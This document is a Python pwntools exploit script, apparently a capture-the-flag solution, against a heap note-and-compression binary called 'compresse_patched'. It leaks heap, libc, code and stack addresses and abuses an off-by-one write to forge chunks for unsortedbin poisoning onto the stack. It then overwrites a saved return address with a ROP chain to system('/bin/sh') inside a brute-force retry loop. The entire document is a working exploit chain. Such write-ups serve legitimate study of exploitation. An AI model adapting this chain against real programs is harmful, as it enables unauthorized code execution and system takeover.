#!/usr/bin/env python3

from pwn import *

exe = ELF('./compresse_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def flate(string):
	sa(b"choice: ", b"1")
	sa(b"flate: ", string)

def deflate(string):
	sa(b"choice: ", b"2")
	sa(b"deflate: ", string)

def new(note):
	sa(b"choice: ", b"3")
	sa(b"note: ", note)

def edit(note):
	sa(b"choice: ", b"4")
	sa(b"note: ", note)

def delete():
	sa(b"choice: ", b"5")

def view():
	sa(b"choice: ", b"6")

def select(idx):
	sa(b"choice: ", b"7")
	sa(b"select: ", f"{idx}".encode() + b"\x00")

script = '''
# read choice
brva 0x185C
'''

while(True):
	try:
		p = process('./compresse_patched')
		#p = gdb.debug('./compresse_patched', gdbscript = script)

		# leak
		## uninitalized buffer
		payload = f"{0x150}A{512 - 0x150 + 1}\x00".encode()
		flate(payload)
		rcu(b"A" * 0x150)
		heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2a0

		payload = f"{0x188}A{512 - 0x188 + 1}\x00".encode()
		flate(payload)
		rcu(b"A" * 0x188)
		libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stdout_']

		payload = f"{0x190}A{512 - 0x190 + 1}\x00".encode()
		flate(payload)
		rcu(b"A" * 0x190)
		code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x4020

		payload = f"{0x1f8}A{512 - 0x1f8 + 1}\x00".encode()
		flate(payload)
		rcu(b"A" * 0x1f8)
		rbp_menu = u64(p.recv(6).ljust(8, b"\x00")) - 0x148

		if(((rbp_menu - 0x4b0) & 0xff) != 0x10):
			raise Exception

		lleak("code", code_base)
		lleak("heap", heap_base)
		lleak("libc", libc_base)
		lleak("rbp menu", rbp_menu)

		# prepare heap layout
		new(b"A" * 0x410)
		new(b"B" * 0x410)

		# off by one to change the current ptr
		select(0)
		flate(b"512A\x00")

		# modify note[0]
		## expand note[0] chunk -> 0x810 
		payload = b"\x00" * 0xa0 + p64(0) + p64(0x811)
		edit(payload)

		# modify note[1] to correct heap layout
		select(1)
		payload = b"C" * 0x3e0 + p64(0) + p64(0x31)
		edit(payload)

		# free note[0], move to unsortedbin
		select(0)
		delete()

		# request allocate, make note[1] = last remainder
		new(b"D" * 0x410)

		# prepare fake unsortedbin chunk in stack (fake1)
		## must pass the next adjacent chunk check
		### next adjacent's size
		for i in range(7, 0, -1): # memset the qword abuse the terminate null byte
			payload = f"{0x1d8}A{i}B\x00".encode()
			flate(payload)

		payload = f"{0x1d8}A".encode()
		payload += b"1\x20\x00" # size = 0x20
		flate(payload)

		### next adjacent's previous size
		for i in range(7, 0, -1): # memset the qword abuse the terminate null byte
			payload = f"{0x1d0}A{i}B\x00".encode()
			flate(payload)

		payload = f"{0x1d0}A".encode()
		payload += b"1\x201\x04\x00" # prev size = 0x420
		flate(payload)

		### fake chunk head
		payload = b"1A".ljust(0x30, b"\x00")
		payload += p64(0) + p64(0x421) # size = 0x421
		payload += p64(heap_base + 0xac0) + p64(heap_base + 0xae0) # fd and bk point to note[1] and fake2
		flate(payload)

		# fake chunk (fake1) in stack is done (target)

		# modify unsortedbin link list via note[1]
		## also create a fake chunk (fake2) in heap to bypass the unlink check
		select(1)
		target = rbp_menu - 0x4a0 + 0x30
		payload = p64(libc_base + 0x203b20) + p64(target) # main_arena+96 && fake1
		payload += p64(0) + p64(0x20) # fake2 head
		payload += p64(target) + p64(0) # fake fd point to target (bk doesnt matter actually)
		payload += p64(0x20) + p64(0x3d0) # next adjacent's head
		payload = payload.ljust(0x3e0, b"\x00")
		payload += p64(0x3f0) + p64(0x30) # restore correct heap layout because of memset
		edit(payload)

		# prepare done
		## all of this just to perform unsortedbin poisoning (not really stable version)
		## bins will corrupt after this

		new(b"A" * 0x10)
		# note[4] now is target chunk

		# use off by one again, modify saved rip of edit
		## only success if rbp_edit = note[4] & 0xffffffffffffff00
		## means that rsp_menu & 0xff = 0x10 
		## require bruteforces
		select(3)
		flate(b"512A\x00")

		system = libc_base + libc.symbols['system']
		pop_rdi = libc_base + 0x000000000010f75b
		ret = pop_rdi + 1
		binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

		payload = p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
		edit(payload)

		sleep(2)
		sl(b"echo vanishing")
		rcu(b"vanishing")
		break

	except:
		try:
			p.close()
		except:
			pass

p.interactive()
